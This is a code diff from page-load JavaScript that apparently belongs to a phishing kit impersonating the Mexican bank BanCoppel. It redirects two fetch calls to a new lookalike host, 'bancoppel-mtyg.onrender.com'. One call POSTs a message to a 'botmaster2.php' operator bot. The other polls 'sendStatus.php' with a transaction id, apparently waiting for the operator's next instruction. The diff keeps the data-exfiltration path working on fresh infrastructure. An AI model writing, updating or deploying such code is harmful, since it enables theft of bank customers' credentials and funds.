@@ -101,7 +101,7 @@ document.addEventListener('DOMContentLoaded', async function () {
   };
 
   // Enviar al bot con botones
-  await fetch("https://bancoppelmxn.onrender.com/botmaster2.php", {
+  await fetch("https://bancoppel-mtyg.onrender.com/botmaster2.php", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
     body: "data=" + encodeURIComponent(mensaje) +
@@ -113,7 +113,7 @@ document.addEventListener('DOMContentLoaded', async function () {
 
   async function revisarAccion(txId) {
     try {
-      const res = await fetch(`https://bancoppelsite.onrender.com/sendStatus.php?txid=${txId}`);
+      const res = await fetch(`https://bancoppel-mtyg.onrender.com/sendStatus.php?txid=${txId}`);
       const json = await res.json();
 
       if (!json.status || json.status === "esperando") {
